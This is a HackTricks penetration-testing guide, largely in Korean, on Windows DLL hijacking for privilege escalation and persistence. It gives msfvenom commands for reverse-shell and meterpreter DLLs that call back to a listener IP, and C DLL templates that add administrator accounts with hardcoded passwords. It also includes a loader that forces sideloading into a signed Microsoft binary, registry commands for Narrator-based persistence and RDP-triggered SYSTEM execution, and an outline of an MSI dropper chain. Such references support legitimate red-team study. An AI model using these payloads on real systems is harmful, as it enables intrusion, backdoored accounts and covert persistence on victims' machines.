# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking은 신뢰된 애플리케이션이 악성 DLL을 로드하도록 조작하는 것을 포함합니다. 이 용어는 **DLL Spoofing, Injection, and Side-Loading** 같은 여러 전술을 포함합니다. 주로 코드 실행, persistence 달성, 그리고 드물게 privilege escalation에 사용됩니다. 여기서는 escalation에 초점을 맞추지만, hijacking 방법 자체는 목적에 상관없이 일관됩니다.

### Common Techniques

여러 방법이 DLL hijacking에 사용되며, 각 방법의 효과는 애플리케이션의 DLL 로딩 전략에 따라 달라집니다:

1. **DLL Replacement**: 정상 DLL을 악성 DLL로 교체하고, 원본 DLL의 기능을 유지하기 위해 선택적으로 DLL Proxying을 사용합니다.
2. **DLL Search Order Hijacking**: 악성 DLL을 합법적 DLL보다 먼저 검색되는 경로에 배치하여 애플리케이션의 검색 패턴을 악용합니다.
3. **Phantom DLL Hijacking**: 애플리케이션이 존재하지 않는 필수 DLL로 착각하고 로드하도록 악성 DLL을 생성합니다.
4. **DLL Redirection**: `%PATH%` 또는 `.exe.manifest` / `.exe.local` 파일 같은 검색 매개변수를 수정하여 애플리케이션이 악성 DLL을 가리키도록 합니다.
5. **WinSxS DLL Replacement**: WinSxS 디렉터리에서 합법적 DLL을 악성 대응물로 교체하는 방식으로, 보통 DLL side-loading과 연관됩니다.
6. **Relative Path DLL Hijacking**: 복사한 애플리케이션과 함께 사용자 제어 디렉터리에 악성 DLL을 배치하는 방식으로 Binary Proxy Execution 기법과 유사합니다.

> [!TIP]
> HTML staging, AES-CTR 구성, 및 .NET implants를 DLL sideloading 위에 레이어링하는 단계별 체인을 보려면 아래 워크플로를 검토하세요.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

시스템 내에서 누락된 Dll을 찾는 가장 일반적인 방법은 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) (sysinternals) 을 실행하고, **다음 2개의 필터를 설정**하는 것입니다:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

그리고 **File System Activity**만 표시합니다:

![](<../../../images/image (153).png>)

일반적으로 **missing dlls in general**을 찾고 있다면 이 상태로 몇 초 동안 실행해 둡니다.\
특정 실행 파일 내의 **missing dll**을 찾고 있다면 **"Process Name" "contains" `<exec name>`** 같은 추가 필터를 설정한 뒤 실행하고 이벤트 캡처를 중지해야 합니다.

## Exploiting Missing Dlls

권한 상승을 위해 가장 유리한 상황은 권한이 높은 프로세스가 로드하려고 시도할 DLL을 우리가 쓸 수 있는 위치에 작성할 수 있을 때입니다. 따라서 DLL이 원본 DLL이 있는 폴더보다 먼저 검색되는 폴더에 악성 DLL을 **작성**할 수 있거나(특이한 경우), 원본 DLL이 어떤 폴더에도 존재하지 않아 해당 DLL이 검색되는 폴더에 **작성**할 수 있는 경우가 이에 해당합니다.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

**Windows applications**는 미리 정의된 여러 검색 경로를 순서대로 따라 DLL을 찾습니다. 악성 DLL이 이러한 디렉터리 중 하나에 전략적으로 배치되면 정품 DLL보다 먼저 로드되어 DLL hijacking 문제가 발생합니다. 이를 방지하는 한 가지 방법은 애플리케이션이 필요한 DLL을 참조할 때 절대 경로를 사용하도록 보장하는 것입니다.

다음은 32-bit 시스템에서의 **DLL search order**입니다:

1. 애플리케이션이 로드된 디렉터리.
2. 시스템 디렉터리. 이 디렉터리의 경로는 [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 함수를 사용하여 얻습니다. (_C:\Windows\System32_)
3. 16-bit 시스템 디렉터리. 이 디렉터리 경로를 얻는 함수는 없지만 검색 대상입니다. (_C:\Windows\System_)
4. Windows 디렉터리. 이 디렉터리의 경로는 [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 함수를 사용하여 얻습니다.
1. (_C:\Windows_)
5. 현재 디렉터리.
6. PATH 환경 변수에 나열된 디렉터리들. 이는 **App Paths** 레지스트리 키에 의해 지정된 애플리케이션별 경로는 포함하지 않음을 유의하세요. **App Paths** 키는 DLL 검색 경로를 계산할 때 사용되지 않습니다.

위는 **SafeDllSearchMode**가 활성화된 기본 검색 순서입니다. 이 기능이 비활성화되면 현재 디렉터리가 두 번째 위치로 상승합니다. 이 기능을 비활성화하려면 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** 레지스트리 값을 생성하고 0으로 설정하세요(기본값은 활성화).

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 함수가 **LOAD_WITH_ALTERED_SEARCH_PATH** 플래그로 호출되면 검색은 **LoadLibraryEx**가 로드하는 실행 모듈의 디렉터리에서 시작됩니다.

마지막으로, **절대 경로를 명시하여 dll을 로드하는 경우** 해당 dll은 **그 경로에서만** 검색됩니다(그 dll에 종속성이 있다면, 그들은 이름으로만 로드된 것처럼 검색됩니다).

검색 순서를 변경하는 다른 방법들도 있지만 여기서는 설명하지 않겠습니다.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

새로 생성된 프로세스의 DLL 검색 경로에 결정론적으로 영향을 주는 고급 방법은 ntdll의 네이티브 API로 프로세스를 생성할 때 RTL_USER_PROCESS_PARAMETERS의 DllPath 필드를 설정하는 것입니다. 여기서 공격자가 제어하는 디렉터리를 제공하면, 대상 프로세스가 DLL을 이름으로 해석할 때(절대 경로가 아니고 안전 로딩 플래그를 사용하지 않는 경우) 해당 디렉터리에서 악성 DLL을 로드하도록 강제할 수 있습니다.

Key idea
- RtlCreateProcessParametersEx로 프로세스 파라미터를 구성하고, 제어 가능한 폴더(예: dropper/unpacker가 위치한 디렉터리)를 가리키는 커스텀 DllPath를 제공합니다.
- RtlCreateUserProcess로 프로세스를 생성합니다. 대상 바이너리가 DLL을 이름으로 해석할 때 로더는 이 제공된 DllPath를 참조하여, 악성 DLL이 대상 EXE와 같은 위치에 없어도 신뢰할 수 있는 sideloading이 가능해집니다.

Notes/limitations
- 이는 생성되는 자식 프로세스에 영향을 미치며, 현재 프로세스에만 영향을 주는 SetDllDirectory와는 다릅니다.
- 대상은 DLL을 이름으로 import하거나 LoadLibrary해야 합니다(절대 경로가 아니고 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories를 사용하지 않는 경우).
- KnownDLLs 및 하드코딩된 절대 경로는 hijack할 수 없습니다. Forwarded exports와 SxS는 우선순위를 변경할 수 있습니다.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

운영 사용 예
- 악성 xmllite.dll(필요한 함수를 내보내거나 실제 DLL로 프록시하는)을 DllPath 디렉터리에 배치합니다.
- 위 기법을 이용해 이름으로 xmllite.dll을 조회하는 것으로 알려진 서명된 바이너리를 실행합니다. 로더는 제공된 DllPath를 통해 임포트를 해결하고 공격자의 DLL을 sideloads 합니다.

이 기법은 실전에서 다단계 sideloading 체인을 구동하는 용도로 관찰되었습니다: 초기 런처가 헬퍼 DLL을 드롭하고, 그 헬퍼는 staging 디렉터리에서 공격자의 DLL을 로드하도록 커스텀 DllPath를 가진 Microsoft-signed된 hijackable 바이너리를 생성합니다.


#### Windows 문서에서의 dll 검색 순서 예외

Windows 문서에는 표준 DLL 검색 순서에 대한 몇 가지 예외가 명시되어 있습니다:

- 메모리에 이미 로드된 것과 동일한 이름을 가진 **DLL이 발견될 경우**, 시스템은 일반 검색을 우회합니다. 대신 리디렉션과 매니페스트를 확인한 후 기본적으로 이미 메모리에 있는 DLL을 사용합니다. **이 경우 시스템은 DLL에 대한 검색을 수행하지 않습니다**.
- 해당 DLL이 현재 Windows 버전에서 **known DLL**로 인식되는 경우, 시스템은 해당 known DLL의 버전과 그에 대한 종속 DLL들을 사용하며 **검색 과정을 건너뜁니다**. 레지스트리 키 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**에는 이러한 known DLL 목록이 저장되어 있습니다.
- **DLL에 종속성이 있는 경우**, 이러한 종속 DLL들에 대한 검색은 초기 DLL이 전체 경로로 지정되었는지와 관계없이 마치 종속 DLL들이 **module names**로만 지시된 것처럼 수행됩니다.

### 권한 상승

**요구사항**:

- **다른 권한**으로 동작하거나 동작할 프로세스( horizontal 또는 lateral movement)를 식별하고, 해당 프로세스에 **DLL이 없는** 상태인지 확인합니다.
- **DLL이 검색될** 모든 **디렉터리**에 대해 **쓰기 권한(write access)**이 있는지 확인합니다. 이 위치는 실행 파일의 디렉터리이거나 시스템 경로 내의 디렉터리일 수 있습니다.

네, 요구조건을 찾는 것은 까다롭습니다. 기본적으로 권한이 높은 실행 파일에서 DLL이 누락된 경우를 찾는 것은 이상하고, 시스템 경로 폴더에 쓰기 권한이 있는 경우는 더 이상합니다(기본적으로는 불가능합니다). 그러나 잘못 구성된 환경에서는 가능합니다.\
운이 좋아 요구사항을 충족하는 경우 [UACME](https://github.com/hfiref0x/UACME) 프로젝트를 확인해보세요. 프로젝트의 **주요 목표는 UAC를 우회(bypass UAC)하는 것**이지만, 거기에서 해당 Windows 버전에 맞는 Dll hijacking의 **PoC**를 찾을 수 있을 것입니다(아마도 쓰기 권한이 있는 폴더 경로만 변경하면 됩니다).

참고로 폴더에서 **권한을 확인하려면** 다음을 실행하세요:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
그리고 **PATH 내 모든 폴더의 권한을 확인하세요**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
executable의 imports와 dll의 exports도 다음으로 확인할 수 있습니다:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)는 system PATH 안의 어떤 폴더에 쓰기 권한이 있는지 확인합니다.\
이 취약점을 발견하는 데 유용한 다른 자동화 도구로는 **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ 및 _Write-HijackDll_가 있습니다.

### Example

만약 exploitable scenario을 발견했다면, 이를 성공적으로 악용하기 위해 가장 중요한 것 중 하나는 실행 파일이 해당 dll에서 import할 모든 함수를 최소한으로 export하는 dll을 만드는 것입니다. 어쨌든, Dll Hijacking은 [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) 또는[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** 권한 상승에 유용하다는 점을 유의하세요. 실행을 위한 dll hijacking 연구에서 **how to create a valid dll**의 예는 다음에서 찾을 수 있습니다: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
또한, **next sectio**n에서는 **basic dll codes** 몇 가지를 템플릿으로 사용하거나 필수 함수가 아닌 것들을 export한 **dll with non required functions exported**를 만들 때 유용하게 쓸 수 있는 예제들을 찾을 수 있습니다.

## **Creating and compiling Dlls**

### **Dll Proxifying**

기본적으로 Dll proxy는 로드될 때 your malicious code를 실행할 수 있으면서도, 실제 라이브러리로의 모든 호출을 중계(relay)하여 기대대로 노출되고 작동하는 Dll입니다.

툴 [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 또는 [**Spartacus**](https://github.com/Accenture/Spartacus)를 사용하면 실행 파일을 지정하고 proxify하려는 라이브러리를 선택하여 proxified dll을 생성하거나, Dll을 지정해 proxified dll을 생성할 수 있습니다.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter (x86) 얻기:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**사용자 생성 (x86 — x64 버전은 보지 못했습니다):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 자신만의

여러 경우 컴파일한 Dll은 피해자 프로세스가 로드할 여러 함수를 반드시 **export several functions**해야 합니다. 이러한 함수들이 존재하지 않으면 그 **binary won't be able to load** 것이며 **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL 예제 (사용자 생성 포함)</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>스레드 진입점을 가진 대체 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## 사례 연구: Narrator OneCore TTS Localization DLL Hijack (접근성/ATs)

Windows의 Narrator.exe는 시작 시 예측 가능한 언어별 로컬라이제이션 DLL을 여전히 탐색하며, 해당 DLL을 hijack하여 임의 코드 실행 및 지속성을 얻을 수 있다.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

최소 DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC 침묵
- 단순한 hijack은 UI를 말하거나 하이라이트합니다. 조용히 하려면 attach 시 Narrator 스레드를 열거하고 메인 스레드를 (`OpenThread(THREAD_SUSPEND_RESUME)`) 열어 `SuspendThread`로 일시중단한 뒤 자체 스레드에서 계속 실행하세요. 전체 코드는 PoC를 참조하세요.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 위 설정으로 Narrator를 시작하면 심어둔 DLL이 로드됩니다. 보안 데스크탑(로그온 화면)에서는 CTRL+WIN+ENTER로 Narrator를 시작하세요.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- 호스트에 RDP로 접속한 뒤 로그온 화면에서 CTRL+WIN+ENTER를 눌러 Narrator를 실행하면, 보안 데스크탑에서 DLL이 SYSTEM으로 실행됩니다.
- RDP 세션이 닫히면 실행이 중지되므로—신속히 inject/migrate 하세요.

Bring Your Own Accessibility (BYOA)
- 내장 Accessibility Tool(AT) 레지스트리 항목(예: CursorIndicator)을 복제하고 임의의 binary/DLL을 가리키도록 편집해 import한 다음 `configuration`을 해당 AT 이름으로 설정할 수 있습니다. 이는 Accessibility 프레임워크 하에서 임의 실행을 프록시합니다.

참고
- `%windir%\System32` 아래에 쓰기 및 HKLM 값을 변경하려면 admin 권한이 필요합니다.
- 모든 페이로드 로직은 `DLL_PROCESS_ATTACH`에 두어도 되며, export는 필요 없습니다.

## 사례 연구: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

이 사례는 Lenovo의 TrackPoint Quick Menu(`TPQMAssistant.exe`)에서 발생한 **Phantom DLL Hijacking**을 보여주며, **CVE-2025-1729**로 추적됩니다.

### 취약점 세부정보

- **구성요소**: `TPQMAssistant.exe` — 위치: `C:\ProgramData\Lenovo\TPQM\Assistant\`
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` 가 매일 오전 9:30에 로그인한 사용자 컨텍스트로 실행됩니다.
- **디렉터리 권한**: `CREATOR OWNER`에 의해 쓰기 가능하여 로컬 사용자가 임의 파일을 떨어뜨릴 수 있습니다.
- **DLL 검색 동작**: 작업 디렉터리에서 먼저 `hostfxr.dll`을 로드하려 시도하며, 없으면 "NAME NOT FOUND"를 로깅하여 로컬 디렉터리 우선 검색을 나타냅니다.

### Exploit Implementation

공격자는 동일 디렉터리에 악성 `hostfxr.dll` 스텁을 배치하여 누락된 DLL을 악용하고 사용자 컨텍스트로 코드 실행을 달성할 수 있습니다:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 공격 흐름

1. 표준 사용자로서 `hostfxr.dll`을 `C:\ProgramData\Lenovo\TPQM\Assistant\`에 드롭합니다.
2. 현재 사용자 컨텍스트에서 예약된 작업이 오전 9:30에 실행될 때까지 대기합니다.
3. 작업이 실행될 때 관리자가 로그인되어 있으면 악성 DLL이 관리자 세션의 medium integrity에서 실행됩니다.
4. 표준 UAC bypass techniques를 연결하여 medium integrity에서 SYSTEM 권한으로 상승합니다.

## 사례 연구: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

공격자는 종종 MSI 기반 드로퍼를 DLL side-loading과 결합하여 신뢰된 서명된 프로세스 하에서 페이로드를 실행합니다.

Chain overview
- 사용자가 MSI를 다운로드합니다. GUI 설치 중 CustomAction이 (예: LaunchApplication 또는 VBScript 액션) 백그라운드로 조용히 실행되어 임베디드 리소스에서 다음 단계를 재구성합니다.
- 드로퍼는 정상적으로 서명된 EXE와 악성 DLL을 동일 디렉터리에 씁니다 (예시 쌍: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- 서명된 EXE가 시작되면, Windows DLL search order가 작업 디렉터리에서 먼저 wsc.dll을 로드하여 서명된 부모 프로세스 아래에서 공격자 코드를 실행합니다 (ATT&CK T1574.001).

MSI 분석 (찾아볼 항목)
- CustomAction 테이블:
- 실행 파일이나 VBScript를 실행하는 항목을 찾습니다. 의심스러운 패턴 예: LaunchApplication이 임베디드 파일을 백그라운드에서 실행하는 경우.
- Orca (Microsoft Orca.exe)에서 CustomAction, InstallExecuteSequence 및 Binary 테이블을 검사합니다.
- MSI CAB에 포함되거나 분할된 페이로드:
- 관리자 추출: msiexec /a package.msi /qb TARGETDIR=C:\out
- 또는 lessmsi 사용: lessmsi x package.msi C:\out
- VBScript CustomAction에 의해 병합되고 복호화되는 여러 작은 조각들을 찾습니다. 일반적인 흐름:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
실전 sideloading with wsc_proxy.exe
- 이 두 파일을 동일한 폴더에 둡니다:
- wsc_proxy.exe: 정상 서명된 호스트(Avast). 프로세스는 디렉터리에서 이름으로 wsc.dll을 로드하려 시도합니다.
- wsc.dll: 공격자 DLL. 특정 exports가 필요 없다면 DllMain으로 충분합니다; 그렇지 않으면 proxy DLL을 만들어 필요한 exports를 정품 라이브러리로 포워딩하면서 DllMain에서 payload를 실행하세요.
- 최소한의 DLL payload를 빌드합니다:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- 내보내기(export) 요구사항의 경우, DLLirant/Spartacus와 같은 프록시 프레임워크를 사용해 payload도 실행하는 forwarding DLL을 생성하세요.

- 이 기법은 호스트 바이너리의 DLL 이름 해석에 의존합니다. 호스트가 절대 경로를 사용하거나 안전 로딩 플래그(예: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories)를 사용하는 경우, hijack이 실패할 수 있습니다.
- KnownDLLs, SxS, 그리고 forwarded exports는 우선순위에 영향을 미칠 수 있으므로, 호스트 바이너리와 export 집합을 선택할 때 고려해야 합니다.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
